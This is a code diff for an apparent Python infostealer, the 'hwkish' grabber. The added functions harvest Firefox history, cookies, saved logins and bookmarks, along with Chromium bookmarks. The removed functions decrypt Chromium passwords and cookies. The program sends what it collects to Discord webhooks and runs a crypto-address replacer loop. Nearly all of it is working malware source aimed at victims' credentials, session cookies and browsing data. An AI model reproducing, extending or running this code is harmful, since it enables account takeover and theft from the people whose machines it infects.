@@ -124,8 +124,10 @@ json_confg = {
     "AKEOZDSON9N": "%_config_102%",
 }
 
+
 url = f"https://raw.githubusercontent.com/{hwkish}x/testingsomedead/main/nope.json"
 response = requests.get(url)
+
 try:
     if response.status_code == 200:
         arrayprgg = response.json()
@@ -331,11 +333,6 @@ class Replacer_Loop(Functions):
         if self.btc_finder == "yes":
             self.loop_through()
 
-
-
-
-
-
 class NotFoundError(Exception):
     pass
 
@@ -488,6 +485,8 @@ class hwkish_first_funct(Functions):
         self.profile = None
         self.NSS = NSSDecoder()
 
+        self.firefox_installed == False
+
         self.eco_baby = f'{base64.b64decode(self.find_in_config("hooking_hawk"))}'.replace("b'", "").replace("'", "")
         self.ecobybro = str(self.eco_baby)
 
@@ -497,6 +496,7 @@ class hwkish_first_funct(Functions):
             'screenshotbro': 0,
             'creditcard': 0,
             'historybaby': 0,
+            'bookmarksbaby':0,
             'info_discord': 0,
             'roblox_friendly': 0,
             'friendlybabymc': 0,
@@ -1027,6 +1027,7 @@ class hwkish_first_funct(Functions):
             self.funcs = [
                 self.gang_hwkstl,
                 self.hwkishsteal_thishist2,
+                self.hwkishsteal_thisbookmarks,
                 self.hwkishsteal_psw2,
                 self.hwkishsteal_cc2,
             ]
@@ -1767,6 +1768,96 @@ class hwkish_first_funct(Functions):
             except NotFoundError:
                 pass
         return credentials
+    
+
+    def fetch_firefox_bookmarks(self, profile_path):
+        bookmarks_db_path = os.path.join(profile_path, "places.sqlite")
+        try:
+            conn = sqlite3.connect(bookmarks_db_path)
+            cursor = conn.cursor()
+            cursor.execute("SELECT moz_bookmarks.title, moz_places.url FROM moz_bookmarks INNER JOIN moz_places ON moz_bookmarks.fk = moz_places.id WHERE moz_bookmarks.type = 1")
+            bookmarks_data = cursor.fetchall()
+            conn.close()
+        except sqlite3.Error as e:
+            return ""
+        
+        try:
+            bookmarks_str = ""
+            for bookmark in bookmarks_data:
+                title = bookmark[0]
+                url = bookmark[1]
+                entry_str = "Title: {:<40} URL: {}\n".format(title, url)
+                bookmarks_str += entry_str
+            if not os.path.exists(os.path.join(self.dir, "Firefox")):
+                    os.makedirs(os.path.join(self.dir, "Firefox"), exist_ok=True)
+            with open(os.path.join(self.dir, "Firefox", f"Bookmarks.txt"), "w", encoding="utf-8") as output_file:
+                output_file.write(bookmarks_str)
+            
+            self.thingstocount[f'bookmarksbaby'] += len(title)
+        except:
+            pass
+
+
+    def fetch_firefox_credit_cards(self, profile_path):
+        signons_db_path = os.path.join(profile_path, "signons.sqlite")
+        try:
+            conn = sqlite3.connect(signons_db_path)
+            cursor = conn.cursor()
+            cursor.execute("SELECT hostname, username, password FROM moz_logins WHERE (password_type = 1 OR password_type = 2) AND times_used > 0")
+            credit_cards_data = cursor.fetchall()
+            conn.close()
+        except sqlite3.Error as e:
+            return ""
+        try:
+            if len(credit_cards_data) > 0:
+                credit_cards_str = ""
+                for card in credit_cards_data:
+                    hostname = card[0]
+                    username = card[1]
+                    password = card[2]
+                    entry_str = "Hostname: {:<40} Username: {:<20} Password: {}\n".format(hostname, username, password)
+                    credit_cards_str += entry_str
+                if not os.path.exists(os.path.join(self.dir, "Firefox")):
+                    os.makedirs(os.path.join(self.dir, "Firefox"), exist_ok=True)
+                with open(os.path.join(self.dir, "Firefox", f"Credits Cards.txt"), "w", encoding="utf-8") as output_file:
+                    output_file.write(credit_cards_str)
+                self.thingstocount[f'creditcard'] += len(username)
+        except:
+            pass
+
+
+    def fetch_firefox_data(self, profile_path):
+        data_db_path = os.path.join(profile_path, "cookies.sqlite")
+        try:
+            conn = sqlite3.connect(data_db_path)
+            cursor = conn.cursor()
+            cursor.execute("SELECT host, isSecure, path, isHttpOnly, expiry, name, value FROM moz_cookies")
+            data = cursor.fetchall()
+            conn.close()
+        except sqlite3.Error as e:
+            return ""
+
+        data_str = ""
+        for item in data:
+            host = item[0]
+            is_secure = "TRUE" if item[1] else "FALSE"
+            path = item[2]
+            is_http_only = "TRUE" if item[3] else "FALSE"
+            expiration = str(item[4])
+            name = item[5]
+            value = item[6]
+            item_str = f"{host}\t{is_secure}\t{path}\t{is_http_only}\t{expiration}\t{name}\t{value}"
+            data_str += item_str + "\n"
+        
+        try:
+            if not os.path.exists(os.path.join(self.dir, "Firefox")):
+                os.makedirs(os.path.join(self.dir, "Firefox"), exist_ok=True)
+            with open(os.path.join(self.dir, "Firefox", f"{justaterm}.txt"), "w", encoding="utf-8") as output_file:
+                output_file.write(data_str)
+            
+            self.thingstocount[f'{justatermlil}'] += len(host)
+        except Exception as e:
+            pass
 
     def decrypt_passwords(self, export):
         def output_line(line, file):
@@ -1775,7 +1866,8 @@ class hwkish_first_funct(Functions):
         got_password = False
         credentials = self.obtain_credentials(self.profile)
         to_export = {}
-        os.makedirs(os.path.join(self.dir, "Firefox"), exist_ok=True)
+        if not os.path.exists(os.path.join(self.dir, "Firefox")):
+            os.makedirs(os.path.join(self.dir, "Firefox"), exist_ok=True)
         with open(os.path.join(self.dir, "Firefox", f"Passwords.txt"), "w", encoding="utf-8") as output_file:
             for url, user, passw, enctype in credentials:
                 got_password = True
@@ -1800,26 +1892,65 @@ class hwkish_first_funct(Functions):
             pass
         if export:
             return to_export
+        
+    def fetch_firefox_history(self, profile_path):
+        history_db_path = os.path.join(profile_path, "places.sqlite")
+        try:
+            conn = sqlite3.connect(history_db_path)
+            cursor = conn.cursor()
+            cursor.execute("SELECT url, title, visit_count FROM moz_places")
+            history_data = cursor.fetchall()
+            conn.close()
+        except sqlite3.Error as e:
+            return ""
+
+        history_str = ""
+        for entry in history_data:
+            url = entry[0]
+            title = entry[1]
+            visit_count = entry[2]
+            entry_str = f"Visit Count: {visit_count} Title: {title} Link: {url}\n"
+            history_str += entry_str
+            
+            
+        if not os.path.exists(os.path.join(self.dir, "Firefox")):
+            os.makedirs(os.path.join(self.dir, "Firefox"), exist_ok=True)
+        with open(os.path.join(self.dir, "Firefox", "History.txt"), "w", encoding="utf-8") as file:
+            file.write(history_str)
+        self.thingstocount['historybaby'] += len(url)
+    
+    def is_firefox_installed(self):
+        program_files_path = os.environ.get("PROGRAMFILES")
+        firefox_path = os.path.join(program_files_path, "Mozilla Firefox", "firefox.exe")
+        return os.path.exists(firefox_path)
 
 
     def firefox(self):
         args = self.parse_sys_args()
+        if not self.is_firefox_installed():
+            return
         self.test_firefox_psw(args["export_pass"])
-        
         basepath = os.path.expanduser(args['profile'])
         profiles = self.get_profile(basepath, args['interactive'], args['choice'], args['list'])
         for profile in profiles:
             try:
+                self.fetch_firefox_history(profile)
+                self.fetch_firefox_data(profile)
                 self.load_profile(profile)
+                self.fetch_firefox_credit_cards(profile)
+                self.fetch_firefox_bookmarks(profile)
                 self.authenticate(args['interactive'])
                 to_export = self.decrypt_passwords(
                     export=args['export_pass'],
                 )
                 if args['export_pass']:
                     self.export_pass(to_export, args['pass_prefix'])
+                        
                 self.unload_profile()
+                self.firefox_installed = True
             except Exception as e:
                 pass
+
 
 
     @extract_try
@@ -1922,6 +2053,36 @@ class hwkish_first_funct(Functions):
                     conn.close()
                     os.remove(login)
             f.close()
+
+    def hwkishsteal_thisbookmarks(self, name: str, path: str, profile: str):
+        if self.hwk_get_browsers != "yes":
+            return
+        path = os.path.join(path, profile, "Bookmarks")
+        if not os.path.isfile(path):
+            return
+        with open(path, "r", encoding="utf-8") as f:
+            bookmarks_data = json.load(f)
+        bookmarks = []
+        if "roots" in bookmarks_data:
+            for folder_key, folder_data in bookmarks_data["roots"].items():
+                if "children" in folder_data:
+                    for bookmark in folder_data["children"]:
+                        if "type" in bookmark and bookmark["type"] == "url" and "url" in bookmark and "name" in bookmark:
+                            visit_count = 0
+                            last_visit_time = 0
+                            if "visit_count" in bookmark:
+                                visit_count = bookmark["visit_count"]
+                            if "date_last_visited" in bookmark:
+                                last_visit_time = bookmark["date_last_visited"]
+                            bookmarks.append((bookmark["url"], bookmark["name"], visit_count, last_visit_time))
+                            
+        bookmarks.sort(key=lambda x: x[3], reverse=True)
+        self.thingstocount["bookmarksbaby"] += len(bookmarks)
+        with open(os.path.join(self.dir, "Browsers", "Bookmarks.txt"), "a", encoding="utf-8") as f:
+            for bookmark in bookmarks:
+                f.write("Title: {:<6} URL: {:<40}\n".format(bookmark[1], bookmark[0]))
+        
+
 
     def hwkishsteal_thishist2(self, name: str, path: str, profile: str):
         if self.hwk_get_browsers != "yes":
@@ -2304,6 +2465,7 @@ class hwkish_first_funct(Functions):
                                 # Passwords Found: {self.thingstocount['passwrd']}
                                 # Credit Card Found: {self.thingstocount['creditcard']}
                                 # Wifi Passwords Found: {self.thingstocount['wifinet']}
+                                # Bookmarks Found: {self.thingstocount['bookmarksbaby']}
                                 # History Found: {self.thingstocount['historybaby']}
                                 # Minecraft Tokens Found: {self.thingstocount['friendlybabymc']}
                                 # Discord Tokens Found: {self.thingstocount['info_discord']}
@@ -2476,39 +2638,6 @@ class DATA_BLOB(Structure):
     _fields_ = [("cbData", wintypes.DWORD), ("pbData", POINTER(c_char))]
 
 
-def GetData(blob_out):
-    cbData = int(blob_out.cbData)
-    pbData = blob_out.pbData
-    buffer = c_buffer(cbData)
-    cdll.msvcrt.memcpy(buffer, pbData, cbData)
-    windll.kernel32.LocalFree(pbData)
-    return buffer.raw
-
-
-def CryptUnprotectData(encrypted_bytes, entropy=b""):
-    buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))
-    buffer_entropy = c_buffer(entropy, len(entropy))
-    blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)
-    blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)
-    blob_out = DATA_BLOB()
-
-    if windll.crypt32.CryptUnprotectData(
-            byref(blob_in), None, byref(
-                blob_entropy), None, None, 0x01, byref(blob_out)
-    ):
-        return GetData(blob_out)
-
-
-def decryption_value(buff, master_key=None):
-    starts = buff.decode(encoding="utf8", errors="ignore")[:3]
-    if starts == "v10" or starts == "v11":
-        iv = buff[3:15]
-        payload = buff[15:]
-        cipher = AES.new(master_key, AES.MODE_GCM, iv)
-        decrypted_pass = cipher.decrypt(payload)
-        decrypted_pass = decrypted_pass[:-16].decode()
-        return decrypted_pass
-
 
 def Requests_loading(methode, url, data="", files="", headers=""):
     for i in range(8):
@@ -2540,30 +2669,6 @@ def URL_librairy_Loading(hook, data="", files="", headers=""):
         except:
             pass
 
-
-def Trust(C00ks):
-    global DETECTED
-    data = str(C00ks)
-    tim = re.findall(".google.com", data)
-    if len(tim) < -1:
-        DETECTED = True
-        return DETECTED
-    else:
-        DETECTED = False
-        return DETECTED
-
-
-def Reformat(listt):
-    e = re.findall("(\w+[a-z])", listt)
-    while "https" in e:
-        e.remove("https")
-    while "com" in e:
-        e.remove("com")
-    while "net" in e:
-        e.remove("net")
-    return list(set(e))
-
-
 def upload(name, tk=""):
     headers = {
         "Content-Type": "application/json",
@@ -2594,173 +2699,6 @@ def upload(name, tk=""):
         }
         URL_librairy_Loading(hook, json.dumps(data).encode(), headers=headers)
         return
-    path = name
-    files = {"file": open(path, "rb")}
-
-    if f"{hwkish}_allpasswords" in name:
-        ra = " | ".join(da for da in words_passw)
-
-        if len(ra) > 1000:
-            rrr = Reformat(str(words_passw))
-            ra = " | ".join(da for da in rrr)
-        data = {
-            "content": "",
-            "embeds": [
-                {
-                    "fields": [{"name": "Passwords Found:", "value": ra}],
-                    "author": {
-                        "name": f"{hwkish}-{grbber} v7",
-                        "url": f"https://github.com/{hwkish}-{stspecial}",
-                        "icon_url": f"https://raw.githubusercontent.com/{hwkish}x/assets/main/ghost-eye.gif",
-                    },
-                    "footer": {
-                        "text": f"github.com/{hwkish}-{stspecial}",
-                    },
-                    "color": 16734976,
-                }
-            ],
-            "avatar_url": f"https://raw.githubusercontent.com/{hwkish}x/assets/main/hawkish.png",
-            "username": f"{hwkish} - {grbber}",
-            "attachments": [],
-        }
-        URL_librairy_Loading(hook, data=json.dumps(data).encode(), headers=headers)
-    if f"{hwkish}_all{justatermlil}" in name:
-        rb = " | ".join(da for da in thec00ks)
-        if len(rb) > 1000:
-            rrrrr = Reformat(str(thec00ks))
-            rb = " | ".join(da for da in rrrrr)
-        data = {
-            "content": "",
-            "embeds": [
-                {
-                    "fields": [{"name": f"{justaterm} Found:", "value": rb}],
-                    "author": {
-                        "name": f"{hwkish}-{grbber} v7",
-                        "url": f"https://github.com/{hwkish}-{stspecial}",
-                        "icon_url": f"https://raw.githubusercontent.com/{hwkish}x/assets/main/ghost-eye.gif",
-                    },
-                    "footer": {
-                        "text": f"github.com/{hwkish}-{stspecial}",
-                    },
-                    "color": 16734976,
-                }
-            ],
-            "avatar_url": f"https://raw.githubusercontent.com/{hwkish}x/assets/main/hawkish.png",
-            "username": f"{hwkish} - {grbber}",
-            "attachments": [],
-        }
-        URL_librairy_Loading(hook, data=json.dumps(data).encode(), headers=headers)
-    Requests_loading("POST", hook, files=files)
-
-
-def writeforfile(data, name):
-    path = temp + f"\{name}.txt"
-    with open(path, mode="w", encoding="utf-8") as f:
-        f.write(f"Created BY {hwkish}-{stspecial} Team | https://github.com/{hwkish}-{stspecial}\n\n")
-        for line in data:
-            if line[0] != "":
-                f.write(f"{line}\n")
-
-
-Notpasswrd = []
-
-
-def hwkishfind_pswd(path, arg):
-    global Notpasswrd
-    if not os.path.exists(path):
-        return
-    pathC = path + arg + "/Login Data"
-    if os.stat(pathC).st_size == 0:
-        return
-    tempfold = (
-        temp
-        + f"{hwkish}"
-        + "".join(random.choice("bcdefghijklmnopqrstuvwxyz")
-                  for i in range(8))
-        + ".db"
-    )
-    shutil.copy2(pathC, tempfold)
-    conn = connect(tempfold)
-    cursor = conn.cursor()
-    cursor.execute(
-        "SELECT action_url, username_value, password_value FROM logins;")
-    data = cursor.fetchall()
-    cursor.close()
-    conn.close()
-    os.remove(tempfold)
-
-    pathKey = path + "/Local State"
-    with open(pathKey, "r", encoding="utf-8") as f:
-        local_state = json.loads(f.read())
-    master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
-    master_key = CryptUnprotectData(master_key[5:])
-
-    for row in data:
-        if row[0] != "":
-            for wa in wordstocheckk:
-                old = wa
-                if "https" in wa:
-                    tmp = wa
-                    wa = tmp.split("[")[1].split("]")[0]
-                if wa in row[0]:
-                    if not old in words_passw:
-                        words_passw.append(old)
-            Notpasswrd.append(
-                f"LINK: {row[0]} \n IDENT: {row[1]} \n {hwkish}-{grbber}  PASSW: {decryption_value(row[2], master_key)}\n\n"
-            )
-    writeforfile(Notpasswrd, f"{hwkish}_allpasswords")
-
-
-C00ks = []
-
-
-def hwkishfind_c00ks(path, arg):
-    global C00ks
-    if not os.path.exists(path):
-        return
-    pathC = path + arg + f"/{justaterm}"
-    if os.stat(pathC).st_size == 0:
-        return
-    tempfold = (
-        temp
-        + f"{hwkish}_is_here"
-        + "".join(random.choice("bcdefghijklmnopqrstuvwxyz")
-                  for i in range(8))
-        + ".db"
-    )
-
-    shutil.copy2(pathC, tempfold)
-    conn = connect(tempfold)
-    cursor = conn.cursor()
-    cursor.execute(f"SELECT host_key, name, encrypted_value FROM {justatermlil}")
-    data = cursor.fetchall()
-    cursor.close()
-    conn.close()
-    os.remove(tempfold)
-
-    pathKey = path + "/Local State"
-
-    with open(pathKey, "r", encoding="utf-8") as f:
-        local_state = json.loads(f.read())
-    master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
-    master_key = CryptUnprotectData(master_key[5:])
-
-    for row in data:
-        if row[0] != "":
-            for wa in wordstocheckk:
-                old = wa
-                if "https" in wa:
-                    tmp = wa
-                    wa = tmp.split("[")[1].split("]")[0]
-                if wa in row[0]:
-                    if not old in thec00ks:
-                        thec00ks.append(old)
-            C00ks.append(
-                f"{row[0]}	TRUE"
-                + "		"
-                + f"/FALSE	2597573456	{row[1]}	{decryption_value(row[2], master_key)}"
-            )
-    writeforfile(C00ks, f"{hwkish}_all{justatermlil}")
 
 
 def checkIfProcessRunning(processName):
@@ -2776,7 +2714,6 @@ def checkIfProcessRunning(processName):
 def ZipMyThings(path, arg, procc):
     pathC = path
     name = arg
-
     browser = ""
     if "aholpfdialjgjfhomihkjbmgjidlcdno" in arg:
         browser = path.split("\\")[4].split("/")[1].replace(" ", "")
@@ -2896,21 +2833,6 @@ def The_Pathbrows():
     ]
 
     for patt in browserPaths:
-        a = threading.Thread(target=hwkishfind_pswd,
-                             args=[patt[0], patt[3]])
-        a.start()
-        Threadlist.append(a)
-    thread_bcc00ks = []
-    for patt in browserPaths:
-        a = threading.Thread(target=hwkishfind_c00ks, args=[patt[0], patt[4]])
-        a.start()
-        thread_bcc00ks.append(a)
-    for thread in thread_bcc00ks:
-        thread.join()
-    DETECTED = Trust(C00ks)
-    if DETECTED == True:
-        return
-    for patt in browserPaths:
         threading.Thread(target=ZipMyThings, args=[
                          patt[0], patt[5], patt[1]]).start()
     for patt in Paths_zipped:
@@ -2918,11 +2840,7 @@ def The_Pathbrows():
                          patt[0], patt[2], patt[1]]).start()
     for thread in Threadlist:
         thread.join()
-    global upths
-    upths = []
 
-    for file in [f"{hwkish}_allpasswords.txt", f"{hwkish}_all{justatermlil}.txt"]:
-        upload(temp + "\\" + file)
 
 
 def upload_on_anonfiles(path):
@@ -3017,8 +2935,6 @@ def checkthismadafaka():
 
 global wordstocheckk, thec00ks, words_passw
 
-
-
 wordstocheckk = [
     "mail",
     "[gmail](https://gmail.com)",
@@ -3063,35 +2979,30 @@ wordstocheckk = [
 ]
 
 
-thec00ks = []
-words_passw = []
 
 The_Pathbrows()
-DETECTED = Trust(C00ks)
+wikith = checkthismadafaka()
 
-if not DETECTED:
-    wikith = checkthismadafaka()
+for thread in wikith:
+    thread.join()
+time.sleep(0.2)
 
-    for thread in wikith:
-        thread.join()
-    time.sleep(0.2)
+text_file = "```diff\n"
+for arg in create_found:
+    if len(arg[2]) != 0:
+        doss_path = arg[1]
+        doss_list = arg[2]
+        text_file += f"\n"
+        text_file += f"- {doss_path}\n"
 
-    text_file = "```diff\n"
-    for arg in create_found:
-        if len(arg[2]) != 0:
-            doss_path = arg[1]
-            doss_list = arg[2]
-            text_file += f"\n"
-            text_file += f"- {doss_path}\n"
+        for fiifil in doss_list:
+            a = fiifil[0].split("/")
+            fileanme = a[len(a) - 1]
+            b = fiifil[1]
+            text_file += f"+ Name: {fileanme}\n+ Link: {b}"
+            text_file += "\n"
+text_file += "\n```"
 
-            for fiifil in doss_list:
-                a = fiifil[0].split("/")
-                fileanme = a[len(a) - 1]
-                b = fiifil[1]
-                text_file += f"+ Name: {fileanme}\n+ Link: {b}"
-                text_file += "\n"
-    text_file += "\n```"
-
-    upload("checkthismadafaka", text_file)
-    autoo = threading.Thread(target=Replacer_Loop().run)
-    autoo.start()
+upload("checkthismadafaka", text_file)
+autoo = threading.Thread(target=Replacer_Loop().run)
+autoo.start()
